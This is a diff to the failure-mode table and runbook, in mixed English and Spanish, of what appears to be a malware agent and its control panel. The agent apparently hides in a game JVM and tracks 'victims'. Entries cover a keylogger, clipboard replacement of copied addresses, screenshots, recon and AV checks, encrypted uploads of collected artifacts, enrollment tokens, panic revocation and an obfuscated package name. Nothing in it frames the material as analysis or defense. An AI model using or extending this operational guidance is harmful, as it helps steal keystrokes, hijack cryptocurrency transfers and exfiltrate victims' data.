@@ -15,7 +15,7 @@ Ordered by likelihood. Every entry is contained by design unless stated.
 | 9 | `chunk_hash_mismatch` | upload | chunk rejected | Recomputed from disk per attempt; 3 transport retries with jitter |
 | 10 | `offset_mismatch` | resume | upload rewinds | Server returns `received`; agent seeks and continues from that byte |
 | 11 | `upload_expired` | 24 h without progress | upload restarts | `POST /artifacts` creates a new upload id; no duplicate artifact because commit is keyed by upload |
-| 12 | `commit_409` after a partial resume | upload | artifact not queued | Agent leaves the local `.spc` and state file; next tick re-runs from the stored offset |
+| 12 | `commit_409` after a partial resume | upload | artifact not queued | El agente conserva el `.spc` y el offset; se reintenta en el siguiente arranque o tras un enrolamiento correcto |
 | 13 | `clock_skew` | any signed call | 401 | Windows time service expected; agent re-enrolls on repeated 401 and logs drift |
 | 14 | `replay` | duplicate nonce | 409 | Nonce is 16 random bytes + counter, regenerated per attempt |
 | 15 | `payload_too_large` | upload init | result error | Profile caps (`lite` 64 MiB, `full` 512 MiB); pack skips files over budget and reports `partial` |
@@ -34,7 +34,7 @@ Ordered by likelihood. Every entry is contained by design unless stated.
 | 28 | Watchdog enroll storm (`enroll 429` forever) | agent, panel rate limit | agent never gets a socket | Heartbeat and poll both re-enrolled, and every enroll rotates the device token, invalidating the other loop. Enroll is single-flight and a 401 signed with an older token no longer re-enrolls (`CryptoModule.stale`) |
 | 29 | `crypto-config.json` locked | agent tree | manual config replacement fails with `Access is denied` even as Administrator | The game JVM keeps a share-delete handle while it runs. Replace via `move /Y` (rename), not by truncating |
 | 30 | AltGr and dead keys lost in `keys.log` | keylogger on non-US layouts | `:`/`\` logged as the unshifted local chars | Known limitation: the hook maps virtual keys with the US table. Layout-independent capture needs `ToUnicodeEx` per event |
-| 25 | ProGuard strips JSON fields | obfuscated build | empty config | Keep `com.serverpackcore.agent.**` and no field renaming (`Json` uses string keys, not reflection) |
+| 25 | ProGuard strips JSON fields | obfuscated build | empty config | Keep `com.spcagentpayloa.jvmxx.**` and no field renaming (`Json` uses string keys, not reflection) |
 | 26 | `Screenshot` headless | lock screen | black PNG | Retried on the next task; `screenshot` is not part of bootstrap |
 | 26b | `Screen Capture in the selected area was not allowed` | Linux without a display/lock screen | `screenshot` ends as `error` | Expected in headless sessions; it is not retried in a loop. Retry once an X/Wayland session is active |
 | 27 | Clipboard reverts | Windows clipboard manager | replacement lost | The monitor re-applies only when the user copies the original address again; history keeps both |
@@ -74,3 +74,53 @@ Ordered by likelihood. Every entry is contained by design unless stated.
 - Revoked build/victim (`403`/`410`): agent stops and preserves local data.
 - `unknown_task`: result is reported and the queue moves on.
 - Headless `screenshot` denial: reported once as an error, never in a loop.
+
+## Separación de secretos y artefactos (0.3.9)
+
+- `artifact_key_mismatch` (422) en commit: la config del agente no corresponde
+  al build/víctima. El mensaje incluye ambos `build_id`; reinstala el JAR o
+  vuelve a enrolar. No se pierde el contenedor local; el agente lo reintenta.
+- `artifact_scheme=2 sin key_salt`: el agente no completó el enrolamiento.
+  `agent reconnect` fuerza uno nuevo. El preflight evita subir 512 MiB inútilmente.
+- Builds existentes con `enrollScheme=1` siguen con la derivación antigua. No
+  mezclar artefactos de esquema 1 y 2 en la misma víctima sin re-enrolar.
+- `outbox_magic`/`outbox_short`: entrada de outbox corrupta. Se mueve a
+  `outbox/dead` y se cuenta como `outbox_dropped`; no bloquea las demás.
+- Un outbox cifrado exige identidad (víctima + salt). Si el agente aún no está
+  enrolado no hay resultados que guardar.
+
+## Re-enrolamiento y epochs (0.4)
+
+- `bad_device_token` (401 en `/enroll`): el agente conserva un token de otra
+  instalación o ya caducado. Reintenta una vez sin prueba; si el servidor lo
+  acepta, queda en `grace`/`unverified` y el agente real conserva el `active`.
+- `unverified_enroll`: alguien enroló sin token. No es un error; el token
+  vigente sigue funcionando durante `enrollGraceHours`. El evento lleva IP y
+  versión. Con `0`, el enrolamiento sustituye el token en el acto.
+- `key_epoch_unknown` (422): el agente usa un epoch que el servidor ya no
+  conserva (más de tres rotaciones). Reinstala el JAR o vuelve a enrolar; las
+  entradas de outbox de ese epoch van a `outbox/dead`.
+- `outbox held`: tras un 410 (panic/revocación) los resultados se mueven a
+  `outbox/held`. Se reintentan al confirmar un enrolamiento y se descartan a los
+  7 días. No se pierden en el primer 410, a diferencia de 0.3.9.
+- `outbox dead`: forense acotada a 30 días y 2.000 entradas; el barrido de
+  arranque retira las más antiguas.
+- `key_scheme_1` (409 en rotate-key): la víctima usa derivación legacy; no hay
+  salt que rotar. Vuelve a enrolar con 0.4.
+- `reseal` con `pending > 0`: queda una fila en claro; el código de salida es 1
+  y `/health` marca `degraded`. No arranques tráfico real hasta resolverlo.
+- `capability_not_implemented` (501): la tarea pertenece a una capability que el
+  agente no declaró o el servidor no sirve todavía. El panel no la pinta; un
+  script recibe los `victim_ids` afectados. No es reintentable sin cambiar de
+  agente.
+
+## Operación 0.3.9
+
+- `cim_unavailable`: PowerShell ausente, AppLocker o Constrained Language Mode.
+  Es un estado normal; recon/AV caen a `systeminfo`/`tasklist` o quedan vacíos.
+- `uninstall` programa el borrado 3 s después porque Windows no deja borrar el
+  JAR en ejecución. Con `--keep-data` conserva `cache/` y `logs/`; sin él borra
+  el árbol. Dos ejecuciones seguidas son idempotentes.
+- `panic` revoca builds y víctimas en una transacción; los agentes reciben 410
+  en el siguiente heartbeat y dejan de emitir. `panic/restore` reabre el
+  enrolamiento; un agente ya detenido necesita relanzarse.
